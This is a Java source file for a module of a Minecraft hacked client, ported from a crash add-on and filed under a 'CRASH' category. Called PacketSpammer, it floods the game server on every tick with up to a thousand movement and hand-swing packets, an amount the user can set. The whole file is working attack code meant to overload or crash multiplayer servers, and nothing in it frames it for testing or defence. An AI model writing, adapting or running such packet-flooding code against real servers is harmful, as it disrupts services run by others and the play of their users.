// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

public class PacketSpammer extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 100, 1, 1000);

    public PacketSpammer() {
        super("PacketSpammer", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        for (int i = 0; i < amount.getValue(); i++) {
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
            mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
    }
}
